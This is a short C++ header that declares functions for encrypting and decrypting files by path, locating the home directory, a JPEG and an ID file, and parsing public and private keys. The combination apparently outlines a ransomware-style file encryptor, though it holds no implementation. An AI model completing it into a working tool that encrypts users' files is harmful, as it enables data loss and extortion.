#pragma once
#include "common.h"
#include <boost/filesystem/operations.hpp>

using namespace boost::filesystem;
using std::string;


bool do_encrypt(const string& path);
bool do_decrypt(const string& path);

bool is_valid_folder(const string& path);
//void process(const path& path);
size_t getFileSize(const string path);
string get_home();
string string_to_hex(const string& input);
string get_path_to_jpeg();
string get_path_to_id();
void parsePublicKey(const string& str, string& mod, string& exp);
struct StringPrivateBlob parsePrivateKey(const string&  str);